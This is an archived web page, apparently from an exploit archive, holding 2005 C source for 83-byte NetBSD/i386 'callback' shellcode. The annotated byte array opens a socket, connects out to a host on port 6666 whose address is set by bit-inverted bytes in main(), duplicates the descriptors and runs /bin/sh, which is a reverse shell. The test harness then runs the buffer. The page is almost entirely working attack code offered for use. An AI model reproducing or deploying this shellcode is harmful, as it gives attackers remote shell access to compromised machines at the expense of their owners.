<html><head><title>NetBSD/x86 - callback (port 6666) - 83 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  minervini at neuralnoise dot com (c) 2005
 *  NetBSD/i386 2.0, callback shellcode (port 6666);
 */

#include &quot;sys/types.h&quot;
#include &quot;stdio.h&quot;
#include &quot;string.h&quot;

char scode[] =
  &quot;\x31\xc0&quot;             // xor    %eax,%eax
  &quot;\x31\xc9&quot;		 // xor    %ecx,%ecx
  &quot;\x50&quot;                 // push   %eax
  &quot;\x40&quot;                 // inc    %eax
  &quot;\x50&quot;                 // push   %eax
  &quot;\x40&quot;                 // inc    %eax
  &quot;\x50&quot;                 // push   %eax
  &quot;\x50&quot;                 // push   %eax
  &quot;\xb0\x61&quot;             // mov    $0x61,%al
  &quot;\xcd\x80&quot;             // int    $0x80
  &quot;\x89\xc3&quot;             // mov    %eax,%ebx
  &quot;\x89\xe2&quot;             // mov    %esp,%edx
  &quot;\x49&quot;                 // dec    %ecx
  &quot;\x51&quot;                 // push   %ecx
  &quot;\x51&quot;                 // push   %ecx
  &quot;\x41&quot;                 // inc    %ecx
  &quot;\x68\xf5\xff\xff\xfd&quot; // push   $0xfdfffff5
  &quot;\x68\xff\xfd\xe5\xf5&quot; // push   $0xf5e5fdff
  &quot;\xb1\x10&quot;             // mov    $0x10,%cl
  &quot;\x51&quot;                 // push   %ecx
  &quot;\xf6\x12&quot;             // notb   (%edx)
  &quot;\x4a&quot;                 // dec    %edx
  &quot;\xe2\xfb&quot;             // loop   .-3
  &quot;\xf6\x12&quot;             // notb   (%edx)
  &quot;\x52&quot;                 // push   %edx
  &quot;\x50&quot;                 // push   %eax
  &quot;\x50&quot;                 // push   %eax
  &quot;\xb0\x62&quot;             // mov    $0x62,%al
  &quot;\xcd\x80&quot;             // int    $0x80
  &quot;\xb1\x03&quot;             // mov    $0x3,%cl
  &quot;\x49&quot;                 // dec    %ecx
  &quot;\x51&quot;                 // push   %ecx
  &quot;\x41&quot;                 // inc    %ecx
  &quot;\x53&quot;                 // push   %ebx
  &quot;\x50&quot;                 // push   %eax
  &quot;\xb0\x5a&quot;             // mov    $0x5a,%al
  &quot;\xcd\x80&quot;             // int    $0x80
  &quot;\xe2\xf5&quot;             // loop   .-9
  &quot;\x51&quot;                 // push   %ecx
  &quot;\x68\x2f\x2f\x73\x68&quot; // push   $0x68732f2f
  &quot;\x68\x2f\x62\x69\x6e&quot; // push   $0x6e69622f
  &quot;\x89\xe3&quot;             // mov    %esp,%ebx
  &quot;\x51&quot;                 // push   %ecx
  &quot;\x54&quot;                 // push   %esp
  &quot;\x53&quot;                 // push   %ebx
  &quot;\x50&quot;                 // push   %eax
  &quot;\xb0\x3b&quot;             // mov    $0x3b,%al
  &quot;\xcd\x80&quot;;            // int    $0x80

int main() {
   scode[23] = ~10;
   scode[24] = ~0;
   scode[25] = ~0;
   scode[26] = ~2;
   void (*code) () = (void *) scode;
   printf(&quot;length: %d\n&quot;, strlen(scode));
   code();
   return (0);
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
